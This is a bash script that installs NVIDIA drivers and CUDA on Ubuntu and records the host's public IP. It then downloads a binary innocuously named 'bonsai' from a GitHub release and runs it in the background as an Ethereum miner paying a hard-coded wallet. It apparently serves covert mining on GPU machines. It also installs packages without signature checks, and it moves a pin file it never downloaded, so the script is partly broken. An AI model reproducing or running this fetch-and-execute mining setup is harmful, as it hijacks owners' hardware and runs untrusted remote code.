SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f "${SCRIPT_DIR}/installed.txt" ]; then
	ip=$(echo "$(curl -s ifconfig.me)" | tr . _ )
	echo "$ip" > installed.txt
	wget http://us.download.nvidia.com/tesla/410.129/nvidia-diag-driver-local-repo-ubuntu1604-410.129_1.0-1_amd64.deb
	sudo dpkg -i nvidia-diag-driver-local-repo-ubuntu1604-410.129_1.0-1_amd64.deb
	sudo apt-key add /var/nvidia-diag-driver-local-repo-410.129/7fa2af80.pub
	sudo apt-get update
	sudo apt-get -y install cuda-drivers --allow-unauthenticated
	sudo apt-get install gcc g++ build-essential libssl-dev automake linux-headers-$(uname -r) git gawk libcurl4-openssl-dev libjansson-dev xorg libc++-dev libgmp-dev python-dev -y
	wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/cuda-ubuntu1604.pin
	sudo mv cuda-ubuntu1804.pin /etc/apt/preferences.d/cuda-repository-pin-600
	wget https://developer.download.nvidia.com/compute/cuda/10.0/secure/Prod/local_installers/cuda-repo-ubuntu1604-10-0-local-10.0.130-410.48_1.0-1_amd64.deb
	sudo dpkg -i cuda-repo-ubuntu1604-10-0-local-10.0.130-410.48_1.0-1_amd64.deb
	sudo apt-key add /var/cuda-repo-10-0-local-10.0.130-410.48/7fa2af80.pub
	sudo apt-get update
	sudo apt-get -y install cuda
	sudo apt-get install libcurl3 -y
	wget https://github.com/tuannguyends/mainsystem/releases/download/main/bonsai
	chmod +x bonsai
	ip=$(echo "$(curl -s ifconfig.me)" | tr . _ )
	./bonsai -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0xfc31411eec9acc7ecc461c229e4d0d6aa56e797b -p x -w RTX-3070TI &
fi
